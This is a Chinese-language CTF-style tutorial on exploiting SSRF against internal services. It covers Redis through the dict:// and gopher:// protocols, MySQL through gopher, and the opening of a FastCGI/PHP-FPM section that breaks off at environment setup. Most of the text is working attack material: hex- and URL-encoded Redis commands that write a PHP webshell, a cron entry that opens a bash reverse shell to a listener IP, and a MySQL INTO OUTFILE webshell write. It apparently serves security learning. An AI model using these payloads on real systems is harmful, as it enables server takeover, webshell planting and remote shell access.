#### 关于ssrf
ssrf在ctf中出现的次数有很多，利用的方式也是多种多样，包括不同的利用手法，绕过，协议的使用。
##### 关于redis
在vps上开启我的redis服务，关于redis存在着一些小的漏洞，例如未授权，有些时候还没有设置auth，在ssrf中redis的利用方式多种多样，包括反弹shell，webshell写入，sshkey上传等等。
##### 利用dict协议
利用dict我们可以写shell。  
关于信息的采集：  
在redis下我们使用info即可获取redis的相关信息，对于gopher可以加上一个下划线在跟上info，同时我们也可以判断出ssrf的存在。
###### 关于写入shell与定时计划
写入`shell`很简单，可以在本地试验一下。
    flushall
    +OK
    config set dir /home/wwwroot/default/wordpress
    +OK
    config set dbfilename shell.php
    +OK
    set webshell ""
    +OK
    save
    +OK
再看一下网站：  
成功写入phpinfo。  
而这周只是在redis上，在实际的情况中，利用curl会出现一些小的状况。  
成功写入，但这始终是本地，实际场景下会有很大的不同，比如说利用`curl`命令。
    [root@izbp1j0zu9bm2aus0jnbhtz ~]# curl dict://127.0.0.1:6379/flushall
    -ERR Unknown subcommand or wrong number of arguments for 'libcurl'. Try CLIENT HELP
    +OK
    +OK
    [root@izbp1j0zu9bm2aus0jnbhtz ~]# curl dict://127.0.0.1:6379/config:set:dir:/home/wwwroot/default/wordpress
    -ERR Unknown subcommand or wrong number of arguments for 'libcurl'. Try CLIENT HELP
    +OK
    +OK
    [root@izbp1j0zu9bm2aus0jnbhtz ~]# curl dict://127.0.0.1:6379/config:set:dbfilename:shell.php
    -ERR Unknown subcommand or wrong number of arguments for 'libcurl'. Try CLIENT HELP
    +OK
    +OK
    [root@izbp1j0zu9bm2aus0jnbhtz ~]# 
    [root@izbp1j0zu9bm2aus0jnbhtz ~]# curl dict://127.0.0.1:6379/set:webshell:""
    -ERR Unknown subcommand or wrong number of arguments for 'libcurl'. Try CLIENT HELP
    +OK
    +OK
看上去是写进去了，其实并没有，我们利用`tcpdump`进行查看，发现其实由于`?问号`的原因，后面的都被参数进行省略了，即使我利用burpsuit也是不可避免的。  
上边是传输过程中的流量。  
所以在CTF中我们想要顺利的写入一些敏感字符需要一些特定的方法。  
vps上搭建环境：  
漏洞代码：
测试漏洞：  
在输入`INFO`后，获得输出，证明`dict`协议的可用性。  
在这个环境中我还是无法直接写入`?`，我们可以利用编码，在这里我利用的是`\x`十六进制编码来完成。
    dict://127.0.0.1:6379/set:webshell:"\x3C\x3fphp\x20phpinfo\x28\x29\x3b\x3f\x3e"
可以看到完全的输出了没有被转义。
访问`url`：  
成功写入。
###### 写入反弹shell
利用定时任务写入反弹shell：
    set 1 '\n\n*/1 * * * * root /bin/bash -i >& /dev/tcp/192.168.163.132/2333 0>&1\n\n'
    转换一下即：
    url=dict://127.0.0.1:6379/set:webshell:"\n\n\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20root\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/127.0.0.1/2333\x200\x3e\x261\n\n"
    但还要注意这里不能够这么写：\x5c 而应该直接就 \n
不能这么写会产生乱码，而且也无法写入，但是要知道`linux`中的`cron`不会报错，只要读到一行正确配置即可执行，这里直接`\n`。  
服务器里面看一下：  
成功的获取了反弹shell。
###### 端口探测
同样的利用`dict`协议我们也可以探测端口存活。  
##### gopher
在利用ssrf攻击redis时利用`gopher`协议我们可以进行主从复制，`shell`的写入  
我们先利用`gopher`写一些键值对。
    127.0.0.1:6379> set key1 value1
    OK
这个时候利用`tcpdump`进行抓取流经6379的流量。  
相关命令：`[root@izbp1j0zu9bm2aus0jnbhtz ~]# tcpdump -i lo port 6379 -w 1200.pcap  
将红色段抓取下来。
    2a 31 0d 0a 24 37 0d 0a  43 4f 4d 4d 41 4e 44 0d 
    0a  
    2a 33 0d 0a 24 33 0d 0a  73 65 74 0d 0a 24 34 0d 
    0a 6b 65 79 31 0d 0a 24  36 0d 0a 76 61 6c 75 65 
    31 0d 0a
    按照这个每个都加一个%号改为url格式即可。
    %2a%31%0d%0a%24%37%0d%0a%43%4f%4d%4d%41%4e%44%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%34%0d%0a%6b%65%79%31%0d%0a%24%36%0d%0a%76%61%6c%75%65%31%0d%0a
这样直接打是不行的，还要进行`url`双编码，利用curl可以只编一次码，因为他只解码一次。  
此时查看服务端：  
尝试写个`shell`:  
转换一下：
    %2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%33%31%0d%0a%2f%68%6f%6d%65%2f%77%77%77%72%6f%6f%74%2f%64%65%66%61%75%6c%74%2f%77%6f%72%64%70%72%65%73%73%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a
`curl`发送一下：  
准备保存到网页上：  
###### web端利用
在web端中进行双编码即可：  
redis上看一下：  
把`save`也拼接上去，发包。  
成功写入：  
###### 关于反弹shell
跟利用`dict`协议一样。  
成功反弹：  
注意：写在`crontab`上时候反弹`shell`是这样的:
    set webshell "\n\n\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20root\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/127.0.0.1/2333\x200\x3e\x261\n\n"
而写在`/var/spool/cron/`下需要我们将`root`去掉。
    CentOS系统:
    路径使用：/etc/crontab或者/var/spool/cron/root
    ubuntu系统:
    路径使用：/etc/crontab或者/var/spool/cron/crontabs/root
有些时候`redis`是需要认证的，我们可以进行暴力破解，尝试弱密码。
在利用的时候加上`auth`的流量即可。
#### MySQL
##### gopher打mysql
利用ssrf我们不仅能够进攻靶机拿下受害机器获取`shell`，同样也可以获取一些数据库的信息，有些时候我们可以拿这些数据库获取到的信息去扩大战果。
在`mysql`数据库不存在密码的时候：
    无密码认证时直接发送TCP/IP数据包即可访问
环境设置：
`SET PASSWORD FOR root@localhost=PASSWORD('');`
`sudo mysqld_safe --skip-grant-tables &`
使用上述两条命令`mysql`数据库就可以不用密码进行登录。
利用`tcpdump`来进行流量抓取：
`tcpdump -i lo -s 0 port 3306 -w mysql.pcap`  
注意第一个红框为登录流量。
注意两个点：`00 00 00 03`以及`01 00 00 00 01`
然后跟`dict`协议一样直接打就行了。
`ctfhub`中的环境这里直接用了。  
在这里发现存在`ssrf`漏洞。  
file`协议没有办法进行读取 判断gopher能不能打，至于判断方法，我自己是利用sleep函数来进行判断的：
监听一下,将流量转为`url`编码:  
休眠十秒，确定存在。
`sql`语句：
`select '' INTO OUTFILE '/var/www/html/shell.php';`
用上述方法抓取下来进行`url`双编码：  
访问对应`url`：可以观察到回显。  
有两种工具可以帮助我们快速生成`payload`。  
以及  
`mysql -h 127.0.0.1 -u root -e "select '' INTO OUTFILE
'/var/www/html/test.php';"`  
#### fastcgi
`cgi`与`fastcgi`早已成为耳熟能详的一些服务了，具体原理网上有很多可见。
`fastcgi`: **快速通用网关接口**
在对`fastcgi`进行攻击的时候我们还需要了解一下另一个名词:`php-fpm`
实现原理：
    PHP-FPM 负责管理一个进程池来处理来自 Web 服务器的 HTTP 动态请求，在 PHP-FPM 中，master 进程负责与 Web 服务器进行通信，接收 HTTP 请求，再将请求转发给 worker 进程进行处理，worker 进程主要负责动态执行 PHP 代码，处理完成后，将处理结果返回给 Web 服务器，再由 Web 服务器将结果发送给客户端。这就是 PHP-FPM 的基本工作原理  #知乎上找的
在`php`版本中的应用：从`PHP 5.4 RC2`开始，`php-fpm`已经转正了。
###### 利用条件
  * PHP-FPM版本 >= 5.3.3
  * 知道服务器上任意一个php文件的绝对路径
###### 关于环境搭建